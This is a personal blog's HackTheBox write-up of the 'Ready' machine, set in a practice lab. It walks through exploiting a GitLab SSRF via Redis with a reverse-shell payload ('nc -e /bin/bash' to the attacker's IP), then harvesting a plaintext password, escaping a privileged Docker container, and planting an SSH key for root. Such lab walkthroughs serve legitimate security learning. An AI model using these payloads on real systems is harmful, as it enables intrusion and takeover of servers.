<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://jakewilliami.github.io/main.css">
  <title>Jake W. Ireland&#x27;s Blog</title>
  <meta name="description" itemprop="about" content="Blog for J. W. Ireland; computer programmer, psychologist, and mathematician">

  
  <link rel="icon" type="image/x-icon" href="https://jakewilliami.github.io/assets/icons/favicon-dark.ico">
  <link rel="apple-touch-icon" href="https://jakewilliami.github.io/assets/icons/apple-touch-icon-dark.png">
  

  
  <link type="application/atom+xml" rel="alternate"
    href="https://jakewilliami.github.io/atom.xml"
    title="Jake W. Ireland&#x27;s Blog" />
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bitter:400,700&display=swap" />

  

</head>


<body>
  <section class='darkmode'>
  <input class='toggle' id='darkmode-toggle' type='checkbox' tabindex="-1">
  <label id="toggle-label-dark" for='darkmode-toggle' tabindex="-1">
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon"
      x="0px" y="0px" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'" xml:space="preserve">
      <title>Change to dark mode</title>
      <path
        d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z" />
    </svg>
  </label>
  <label id="toggle-label-light" for='darkmode-toggle' tabindex="-1">
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon"
      x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35;" xml:space="preserve">
      <title>Change to light mode</title>
      <path
        d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z" />
    </svg>
  </label>
</section>

<style>
  .darkmode {
    display: inline-block;

    &>.toggle {
      display: none;
      box-sizing: border-box;
    }

    & svg {
      opacity: 0;
      width: 20px;
      height: 20px;
      fill: var(--gray);
      transition: opacity 0.1s ease;
      cursor: pointer;
    }

    .toggle:checked~label {
      &>#dayIcon {
        opacity: 0;
        display: none;
      }

      &>#nightIcon {
        opacity: 1;
        filter: invert(1);
      }
    }

    .toggle:not(:checked)~label {
      &>#dayIcon {
        opacity: 1;
      }

      &>#nightIcon {
        opacity: 0;
        display: none;
      }
    }
</style>

<script>
  const userPref = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark'
  const currentTheme = localStorage.getItem('theme') ?? userPref
  const syntaxTheme = document.querySelector("#theme-link");

  if (currentTheme) {
    document.documentElement.setAttribute('saved-theme', currentTheme);
  }

  const switchTheme = (e) => {
    if (e.target.checked) {
      document.documentElement.setAttribute('saved-theme', 'dark');
      localStorage.setItem('theme', 'dark');
    }
    else {
      document.documentElement.setAttribute('saved-theme', 'light')
      localStorage.setItem('theme', 'light')
    }
  }

  window.addEventListener('DOMContentLoaded', () => {
    // Darkmode toggle
    const toggleSwitch = document.querySelector('#darkmode-toggle')

    // listen for toggle
    toggleSwitch.addEventListener('change', switchTheme, false)

    if (currentTheme === 'dark') {
      toggleSwitch.checked = true
    }
  })

</script>


<nav class="nav">
  <section class="nav-container">

    <a href="https://jakewilliami.github.io/">
      <h2 class="nav-title">Jake W. Ireland&#x27;s Blog</h2>
    </a>
    <ul>
      
      
      <li><a href="https://jakewilliami.github.io/about">About</a></li>
      
    </ul>
  </section>
</nav>


  <main>
    
<article class="post">
	<section class="post-info">
		
		<span>on&nbsp;</span><time datetime="2021-04-12">Monday, 12 April, 2021</time>
	</section>
	<h1 class="post-title">
      HackTheBox Write-upâ€”Ready
    </h1>
	<section class="post-line"></section>
	<p>This machine has IP 10.10.10.220.</p>
<p>Let's use <code>nmap</code> to enumerate the ports available to us:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">Starting</span><span> Nmap 7.91 ( https://nmap.org ) </span><span style="color:#50fa7b;">at</span><span> 2021-04-12 19:36 NZST
</span><span style="color:#50fa7b;">Nmap</span><span> scan report for 10.10.10.220
</span><span style="color:#50fa7b;">Host</span><span> is up (0.28s latency)</span><span style="color:#8be9fd;">.
</span><span style="color:#50fa7b;">Not</span><span> shown: 998 closed ports
</span><span style="color:#50fa7b;">PORT</span><span>     STATE SERVICE VERSION
</span><span style="color:#50fa7b;">22/tcp</span><span>   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux</span><span style="color:#ff79c6;">; </span><span style="color:#50fa7b;">protocol</span><span> 2.0)
</span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">ssh-hostkey:
</span><span style="color:#ff79c6;">|   </span><span style="color:#50fa7b;">3072</span><span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span><span style="color:#ff79c6;">|   </span><span style="color:#50fa7b;">256</span><span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span><span style="color:#ff79c6;">|</span><span style="color:#50fa7b;">_</span><span>  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span><span style="color:#50fa7b;">5080/tcp</span><span> open  http    nginx
</span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">http-robots.txt:</span><span> 53 disallowed entries (15 shown)
</span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">/</span><span> /autocomplete/users /search /api /admin /profile
</span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">/dashboard</span><span> /projects/new /groups/new /groups/</span><span style="color:#ff79c6;">*</span><span>/edit /users /help
</span><span style="color:#ff79c6;">|</span><span style="color:#50fa7b;">_/s/</span><span> /snippets/new /snippets/</span><span style="color:#ff79c6;">*</span><span>/edit
</span><span style="color:#ff79c6;">| </span><span style="color:#50fa7b;">http-title:</span><span> Sign in </span><span style="color:#ff79c6;">\x</span><span>C2</span><span style="color:#ff79c6;">\x</span><span>B7 GitLab
</span><span style="color:#ff79c6;">|</span><span style="color:#50fa7b;">_Requested</span><span> resource was http://10.10.10.220:5080/users/sign_in
</span><span style="color:#ff79c6;">|</span><span style="color:#50fa7b;">_http-trane-info:</span><span> Problem with XML parsing of /evox/about
</span><span style="color:#50fa7b;">Service</span><span> Info: OS: Linux</span><span style="color:#ff79c6;">; </span><span style="color:#50fa7b;">CPE:</span><span> cpe:/o:linux:linux_kernel
</span><span>
</span><span style="color:#50fa7b;">Service</span><span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span style="color:#50fa7b;">Nmap</span><span> done: 1 IP address (1 host up) </span><span style="color:#50fa7b;">scanned</span><span> in 68.48 seconds
</span></code></pre>
<p>Immediately I see that there is another gitlab server running on port <code>5080</code> (as in Laboratory)...but I am still working on that machine too (today I started a bunch of different machines).</p>
<p>I go to <code>http://ready:5080/</code> and it asks me to sign in.  I try to make an account but I get a <code>422</code> error.</p>
<p>I found <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">this</a> exploit after looking up GitLab exploits on Google.  The latter page shows a very cool video on how (for a particular version of GitLab), SSRF (server-side request forgery) can turn into RCE (remote code execution) via Redis.  Apparently it uses a special IPV6 to embed an IPV4 here: <code>0:0:0:0:0:ffff:127.01.1</code></p>
<p>Trying again to make an account, I succeed.  I am now signed in, and I make a new project.  I import project by URL, and see if the following URL works (using the aforementioned IPV6):</p>
<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>git://[0:0:0:0:0:ffff:127.0.0.1]:1234/test/ssrf.git
</span></code></pre>
<p>Before hitting &quot;create&quot;, let's open up Burp Suite and intercept this.  Now, from <a href="https://github.com/jas502n/gitlab-SSRF-redis-RCE#burpsuite-request">here</a> we find a Burp Suite exploit that involves changing the <code>import_url</code> body parameter to</p>
<pre style="background-color:#282a36;color:#f8f8f2;"><code><span>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
</span><span>
</span><span> multi
</span><span>
</span><span> sadd resque:gitlab:queues system_hook_push
</span><span>
</span><span> lpush resque:gitlab:queue:system_hook_push &quot;{\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#39;|nc -e /bin/bash 10.10.14.239 1234\&#39;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568}&quot;
</span><span>
</span><span> exec
</span><span>
</span><span> exec
</span><span>
</span><span>/ssrf.git
</span></code></pre>
<p>Before sending it, start up netcat:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">nc</span><span style="font-style:italic;color:#ffb86c;"> -nvlp</span><span> 1234
</span></code></pre>
<p>Now send it to repeater and go, and we find that our netcat window has a reverse shell.  Let's do the usual steps of making this shell more stable:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">python3</span><span style="font-style:italic;color:#ffb86c;"> -c </span><span style="color:#f1fa8c;">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</span><span style="color:#ff79c6;">export </span><span style="color:#ffffff;">TERM</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">xterm-colors
</span></code></pre>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">$</span><span> nc</span><span style="font-style:italic;color:#ffb86c;"> -nvlp</span><span> 1234
</span><span style="color:#50fa7b;">Connection</span><span> from 10.10.10.220:33452
</span><span style="color:#50fa7b;">python3</span><span style="font-style:italic;color:#ffb86c;"> -c </span><span style="color:#f1fa8c;">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> export TERM=xterm-colors
</span><span style="color:#ff79c6;">export </span><span style="color:#ffffff;">TERM</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">xterm-colors
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$
</span></code></pre>
<p>Great.  We are glad this works because we didn't actually have any confirmation that this version is before the 11.4.8 patch.  Let's see where we are in the machine:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> pwd
</span><span style="color:#8be9fd;">pwd
</span><span style="color:#50fa7b;">/var/opt/gitlab/gitlab-rails/working
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> echo $</span><span style="color:#ffffff;">HOME
</span><span style="color:#8be9fd;">echo </span><span>$</span><span style="color:#ffffff;">HOME
</span><span style="color:#50fa7b;">/var/opt/gitlab
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> ls /home
</span><span style="color:#50fa7b;">ls</span><span> /home
</span><span style="color:#50fa7b;">dude
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> ls /home/dude
</span><span style="color:#50fa7b;">ls</span><span> /home/dude
</span><span style="color:#50fa7b;">user.txt
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> cat /home/dude/user.txt
</span><span style="color:#50fa7b;">cat</span><span> /home/dude/user.txt
</span><span style="color:#50fa7b;">e1e3************************7682
</span><span style="color:#50fa7b;">git@gitlab:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">/gitlab-rails/working$</span><span> whoami
</span><span style="color:#50fa7b;">whoami
</span><span style="color:#50fa7b;">git
</span></code></pre>
<p>So, despite being the user <code>git</code>, we have collected <code>dude</code>'s user flag.</p>
<p>We look for a plain-text passowrd:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">find</span><span> /</span><span style="font-style:italic;color:#ffb86c;"> -type</span><span> f </span><span style="color:#ff79c6;">| while </span><span style="color:#50fa7b;">IFS</span><span>= read</span><span style="font-style:italic;color:#ffb86c;"> -r</span><span> file</span><span style="color:#ff79c6;">; do </span><span style="color:#50fa7b;">grep</span><span style="font-style:italic;color:#ffb86c;"> -i</span><span> password </span><span style="color:#f1fa8c;">&quot;$</span><span style="color:#ffffff;">file</span><span style="color:#f1fa8c;">&quot; </span><span style="color:#ff79c6;">&amp;&amp; </span><span style="color:#8be9fd;">echo </span><span style="font-style:italic;color:#ffb86c;">-e </span><span style="color:#f1fa8c;">&quot;\u001b[1;38m$</span><span style="color:#ffffff;">file</span><span style="color:#f1fa8c;">\u001b[0;38m\n\n&quot;</span><span style="color:#ff79c6;">; done
</span></code></pre>
<p>After a bit of digging, we find a folder <code>/opt/backup</code> that contains a plain-text password: <code>grep -i password /opt/backup/gitlab.rb | grep smtp | awk -F'=' '{print $2}' | sed 's/[[:space:]]*&quot;//g'</code>.</p>
<p>We can now run <code>su root</code> using the aforementioned <code>smtp_password</code>, and now we are logged in as root!</p>
<p>But we ls the <code>/root</code> directory and don't find anything.  If you will recall, we saw, in the <code>/opt/backup</code> directory, a <code>docker-compose.yml</code> file.  I think we are inside a docker container, not the actual computer.</p>
<p>To get out of a docket container, I found <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">this</a> exploit:</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;">cd</span><span> /tmp</span><span style="color:#ff79c6;">; </span><span style="color:#50fa7b;">mkdir</span><span> test</span><span style="color:#ff79c6;">;  </span><span style="color:#50fa7b;">mount</span><span> /dev/sda2 /tmp/test</span><span style="color:#ff79c6;">; </span><span style="color:#50fa7b;">cat</span><span> /tmp/test/root/root.txt
</span><span style="color:#50fa7b;">...
</span><span style="color:#50fa7b;">b7f9************************c2b3
</span></code></pre>
<p>But we haven't actually become root yet (though we are functionally root and have root access to everything).  To do this, we need to create a new <code>ssh</code> key on <em>your</em> machine, using <code>ssh-keygen</code>.  Now copy this (<code>cat ~/.ssh/id_rsa.pub</code> | pbcopy`) and, on the host machine, run</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#6272a4;"># echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfa3l1lcRiEwk3/HoXukpmecOH0O8HoAknkB2ux6mwN8L2h88dQdbsfeLBIBxYdJAk8BUxZpuKxbz/sAaY2OgT2Pk4e+z3ah/ldI7NJmFyJBXdeFCBk21p05rpA36ODmidIGVO+PLwLZH1l7DHWvJTkuuRl5HVxID2cE6oJZyVmzKMaTKbqjwGdIpgt6VACCOUmG2gE71d3LFttcKFVo3BB5n9uJdXJfIXGWmyvcgEF8IriZRpZMl1qHGDgPH56uAySZVYwtCStWl8dXTZKX4Uo2VgzGwH36SZ2Oyyw0I+oPfo2IE3uTFrKgujdzvnVzYRI7FiYgFMGhAHIEhkGj5R jakeireland@jake-mbp2017-6917.local&#39; &gt;&gt; /tmp/test/root/.ssh/authorized_keys
</span></code></pre>
<p>Now run (from <em>your</em> machine)</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">ssh</span><span style="font-style:italic;color:#ffb86c;"> -i</span><span> id_rsa root@10.10.10.220
</span></code></pre>
<p>Now you are in!</p>
<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">root@ready:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">#</span><span> cat /root/root.txt
</span><span style="color:#50fa7b;">b7f9************************c2b3
</span></code></pre>

</article>

<section class="pagination">
	<a href="https://jakewilliami.github.io/perfect-powers/" class="left arrow">&#8592;</a>
	<a href="#" class="top">Top</a>
	<a href="https://jakewilliami.github.io/uri-vs-url/" class="right arrow">&#8594;</a>
</section>

  </main>

  <footer>

  <span class="copyright">
    &copy; 2020&ndash;2024 Jake W. Ireland. Powered by <a href="https://www.getzola.org">Zola</a> and <a href="https://github.com/semanticdata/mabuya">Mabuya</a>/<a href="https://github.com/aaranxu/tale-zola">Tale</a>; inspired by <a href="https://github.com/nielsenramon/chalk">Chalk</a>.
  </span>

  <nav class="navigation-footer">
    <ul>
      <li><a href="https://github.com/jakewilliami">GitHub</a></li>
      <li><a href="https://twitter.com/JakeWIreland">Twitter</a></li>
      <li><a href="https://www.linkedin.com/in/jake-ireland-nz/">LinkedIn</a></li>
    </ul>
  </nav>

</footer>

</body>

</html>